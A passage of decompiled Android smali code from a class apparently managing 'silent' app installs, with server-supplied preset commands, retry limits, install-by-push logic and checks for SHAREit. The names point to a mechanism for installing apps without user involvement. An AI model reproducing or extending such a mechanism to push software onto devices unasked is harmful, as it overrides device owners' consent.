
    check-cast v5, Lcow/silence/entity/PresetCommand;

    invoke-static {v0, v5}, Lcow/silence/helper/SilenceHelper;->containsCommand(Ljava/util/List;Lcow/silence/entity/PresetCommand;)Z

    move-result v6

    if-eqz v6, :cond_5

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v6

    iget-wide v8, v5, Lcow/silence/entity/PresetCommand;->endTime:J

    sub-long/2addr v6, v8

    cmp-long v8, v6, v1

    if-lez v8, :cond_4

    :cond_5
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v6

    iget-wide v8, v5, Lcow/silence/entity/PresetCommand;->endTime:J

    sub-long/2addr v6, v8

    cmp-long v8, v6, v1

    if-lez v8, :cond_6

    const-string v6, "2"

    goto :goto_3

    :cond_6
    const-string v6, "3"

    :goto_3
    invoke-direct {p0, v5, v6}, Lcow/silence/SilenceInstallManager;->deleteItem(Lcow/silence/entity/PresetCommand;Ljava/lang/String;)V

    invoke-interface {v4}, Ljava/util/Iterator;->remove()V
    :try_end_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    goto :goto_2

    :cond_7
    monitor-exit p0

    return-object v3

    :cond_8
    :goto_4
    :try_start_1
    invoke-static {}, Lcom/cow/ObjectStore;->getContext()Landroid/content/Context;

    move-result-object v0

    invoke-static {v0}, Lcow/silence/database/SilenceInstallDataBase;->getDatabase(Landroid/content/Context;)Lcow/silence/database/SilenceInstallDataBase;

    move-result-object v0

    invoke-virtual {v0}, Lcow/silence/database/SilenceInstallDataBase;->listCommands()Ljava/util/List;

    move-result-object v0

    invoke-interface {v0}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v0

    :goto_5
    invoke-interface {v0}, Ljava/util/Iterator;->hasNext()Z

    move-result v3

    if-eqz v3, :cond_a

    invoke-interface {v0}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Lcow/silence/entity/PresetCommand;

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v4

    iget-wide v6, v3, Lcow/silence/entity/PresetCommand;->endTime:J

    sub-long/2addr v4, v6

    cmp-long v6, v4, v1

    if-lez v6, :cond_9

    const-string v4, "2"

    goto :goto_6

    :cond_9
    const-string v4, "3"

    :goto_6
    invoke-direct {p0, v3, v4}, Lcow/silence/SilenceInstallManager;->deleteItem(Lcow/silence/entity/PresetCommand;Ljava/lang/String;)V
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    goto :goto_5

    :cond_a
    const/4 v0, 0x0

    monitor-exit p0

    return-object v0

    :catchall_0
    move-exception v0

    monitor-exit p0

    throw v0
.end method


# virtual methods
.method public installByDownload(Lcow/silence/entity/PresetCommand;)V
    .locals 8

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v0

    iget-wide v2, p1, Lcow/silence/entity/PresetCommand;->installTime:J

    sub-long/2addr v0, v2

    sget-wide v4, Lcow/silence/helper/SilenceHelper;->INSTALL_INTERVAL:J

    const-string v6, "SilenceInstall"

    cmp-long v7, v0, v4

    if-gez v7, :cond_0

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v1, "current_time--->"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v1

    invoke-virtual {v0, v1, v2}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v6, v0}, Lcom/cow/s/u/Logger;->d(Ljava/lang/String;Ljava/lang/String;)V

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v1, "install_time--->"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-wide v1, p1, Lcow/silence/entity/PresetCommand;->installTime:J

    invoke-virtual {v0, v1, v2}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-static {v6, p1}, Lcom/cow/s/u/Logger;->d(Ljava/lang/String;Ljava/lang/String;)V

    const-string p1, "current_time - install_time < 5min"

    invoke-static {v6, p1}, Lcom/cow/s/u/Logger;->d(Ljava/lang/String;Ljava/lang/String;)V

    return-void

    :cond_0
    invoke-static {v2, v3}, Lcow/silence/helper/SilenceHelper;->isToday(J)Z

    move-result v0

    if-eqz v0, :cond_1

    iget v0, p1, Lcow/silence/entity/PresetCommand;->retryCount:I

    int-to-long v0, v0

    sget-wide v2, Lcow/silence/helper/SilenceHelper;->RETRY_COUNT:J

    cmp-long v4, v0, v2

    if-lez v4, :cond_1

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v1, "retry_count--->"

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget p1, p1, Lcow/silence/entity/PresetCommand;->retryCount:I

    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-static {v6, p1}, Lcom/cow/s/u/Logger;->d(Ljava/lang/String;Ljava/lang/String;)V

    const-string p1, "too many retry"

    invoke-static {v6, p1}, Lcom/cow/s/u/Logger;->d(Ljava/lang/String;Ljava/lang/String;)V

    return-void

    :cond_1
    iget-wide v0, p1, Lcow/silence/entity/PresetCommand;->installTime:J

    invoke-static {v0, v1}, Lcow/silence/helper/SilenceHelper;->isToday(J)Z

    move-result v0

    if-nez v0, :cond_2

    const/4 v0, 0x1

    iput v0, p1, Lcow/silence/entity/PresetCommand;->retryCount:I

    :cond_2
    const/4 v0, 0x0

    invoke-direct {p0, p1, v0}, Lcow/silence/SilenceInstallManager;->install(Lcow/silence/entity/PresetCommand;Z)V

    return-void
.end method

.method public installByPush(Lcow/silence/entity/PresetCommand;)V
    .locals 2

    iget-object v0, p0, Lcow/silence/SilenceInstallManager;->installedAppList:Ljava/util/List;

    const/4 v1, 0x1

    invoke-static {p1, v0, v1}, Lcow/silence/helper/SilenceHelper;->needInstall(Lcow/silence/entity/PresetCommand;Ljava/util/List;Z)Z

    move-result v0

    if-eqz v0, :cond_0

    invoke-direct {p0, p1, v1}, Lcow/silence/SilenceInstallManager;->install(Lcow/silence/entity/PresetCommand;Z)V

    :cond_0
    return-void
.end method

.method public requestSilenceInstallList(Z)V
    .locals 2

    invoke-static {}, Lcow/silence/helper/SilenceHelper;->checkToolInstalled()Z

    move-result v0

    const-string v1, "SilenceInstall"

    if-nez v0, :cond_0

    const-string p1, "shareit not install "

    invoke-static {v1, p1}, Lcom/cow/s/u/Logger;->d(Ljava/lang/String;Ljava/lang/String;)V

    return-void

    :cond_0
    invoke-static {}, Lcow/silence/helper/SilenceHelper;->checkToolVersion()Z

    move-result v0

    if-nez v0, :cond_1

    const-string v0, "shareit version low"

    invoke-static {v1, v0}, Lcom/cow/s/u/Logger;->d(Ljava/lang/String;Ljava/lang/String;)V

    :cond_1
    iget-boolean v0, p0, Lcow/silence/SilenceInstallManager;->requesting:Z

    if-eqz v0, :cond_2

    return-void

    :cond_2
    const/4 v0, 0x1

    iput-boolean v0, p0, Lcow/silence/SilenceInstallManager;->requesting:Z

    sput-boolean p1, Lcow/silence/net/SilenceInstallRequest;->isDebug:Z

    new-instance p1, Lcow/silence/SilenceInstallManager$1;

    invoke-direct {p1, p0}, Lcow/silence/SilenceInstallManager$1;-><init>(Lcow/silence/SilenceInstallManager;)V

    invoke-static {p1}, Lcom/github/base/core/thread/TaskHelper;->exec(Lcom/github/base/core/thread/TaskHelper$Task;)Lcom/github/base/core/thread/TaskHelper$Task;

    return-void
.end method
